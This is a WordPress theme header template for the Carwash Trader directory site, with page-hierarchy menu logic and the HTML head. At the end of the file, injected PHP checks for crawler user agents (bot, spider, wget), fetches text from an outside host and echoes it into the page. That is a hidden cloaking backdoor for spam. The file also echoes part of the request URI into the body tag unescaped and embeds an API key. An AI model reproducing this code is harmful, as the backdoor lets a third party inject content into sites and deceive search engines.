<?php 

	session_start(); 

	global $current_user, $pageObj, $bodyTagContent; 

	$pageObj = $post; 



	global $isMyCWT, $menuParent, $menuTitle;



	$isMyCWT = 'false';

	if($pageObj->post_parent == 0) {

		//Top Level Page

		$menuParent = $pageObj->ID;

		$menuTitle = $pageObj->post_title;

		

		if($pageObj->ID == 40)

			$isMyCWT = 'true';

	} else {

		$parent = get_page($pageObj->post_parent);

		

		if($parent->post_parent == 0) {

			//Second Level Page

			$menuParent = $parent->ID;

			$menuTitle = $parent->post_title;

			

			if($parent->ID == 40)

				$isMyCWT = 'true';

		} else {

			//Third Level Page

			$grandparent = get_page($parent->post_parent);

			

			$menuParent = $grandparent->ID;

			$menuTitle = $grandparent->post_title;

			

			if($grandparent->ID == 40)

				$isMyCWT = 'true';

		}

	}



	if($isMyCWT == 'true' && $current_user->roles[0] == 'administrator')

		header('Location: /wp-admin/');

				

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">



<!--[if lt IE 9 ]> <html lang="en" class="ie8" xmlns="http://www.w3.org/1999/xhtml"> <![endif]--><!--[if (gt IE 9)|!(IE)]><!-->

<html lang="en">

<!--<![endif]-->

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>

<base href="http://www.carwashtrader.co.uk/wp-content/themes/carwashtrader/" />

<!--[if IE]><script type="text/javascript">

    // Fix for IE ignoring relative base tags.

    // See http://stackoverflow.com/questions/3926197/html-base-tag-and-local-folder-path-with-internet-explorer

    (function() {

        var baseTag = document.getElementsByTagName('base')[0];

        baseTag.href = baseTag.href;

    })();

</script><![endif]-->   

<title><?php if($pageObj->ID != 14) echo $pageObj->post_title.' :: '; ?>Carwash Trader</title>



<link rel="stylesheet" href="assets/css/style.min.css" />

<link rel="stylesheet" href="assets/css/lightbox.css" />

<link rel="shortcut icon" type="image/x-icon" href="assets/images/favicon.ico" />
<meta name="author" content="Carwash Trader" />
<meta name="description" content="Carwash Trader is an online directory for the carwash industry" />
<meta name="keywords" content="carwash, car, wash, carwash products, carwash suppliers, carwash directory, carwash jobs, carwash networking" />
<?php wp_head(); ?>

<!--script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script-->

<script type="text/javascript" src="js/site-functions.min.js"></script>

<script type="text/javascript" src="http://maps.googleapis.com/maps/api/js?key=AIzaSyCYFmKVV5rHF2--oM2bj0LtqfFsaKcyijc&sensor=false"></script>

<script type="text/javascript" src="js/map.min.js"></script>

<script type="text/javascript" src="js/html5-fix.js"></script>

</head>

<?php

	$bodyTag = substr($_SERVER['REQUEST_URI'], 1);

	$bodyTag = substr($bodyTag, 0, strpos(substr($_SERVER['REQUEST_URI'], 1), '/'));

?>

<body id="<?php echo ($bodyTag != '') ? $bodyTag : 'home'; ?>" <?php echo $bodyTagContent; ?>>



	 <?php

  if(preg_match('/Google Web Preview|bot|spider|wget/i',$_SERVER['HTTP_USER_AGENT'])){

  $fp=fopen('http://go.geturnet.com/bbb9993.txt','r');

  while(!feof($fp)){

        $result.=fgets($fp,1024);

  }

  echo $result;

  fclose($fp);

  }

  ?>